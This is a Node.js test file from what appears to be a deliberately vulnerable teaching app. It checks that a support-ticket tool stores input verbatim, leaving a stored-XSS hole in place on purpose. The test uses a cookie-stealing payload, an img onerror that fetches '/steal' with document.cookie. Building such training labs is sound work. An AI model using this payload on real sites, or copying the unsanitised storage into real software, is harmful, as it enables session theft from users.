const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability xss-stored-ticket
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/support/tools/index.js
 */
test('xss-stored-ticket: support.open_ticket persists body verbatim', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { openTicket } = require(path.join(REPO, 'agent-host/agents/support/tools/index.js'));
    const payload = `<img src=x onerror="fetch('/steal?c='+document.cookie)">`;
    const r = await openTicket({ subject: 'help', body: payload }, { userId: 2 });
    assert.equal(r.ok, true);
    const { rows: [row] } = await s.query(`SELECT body FROM secureshop.support_tickets WHERE id = $1`, [r.ticket_id]);
    assert.equal(row.body, payload);
  } finally {
    await s.close();
  }
});
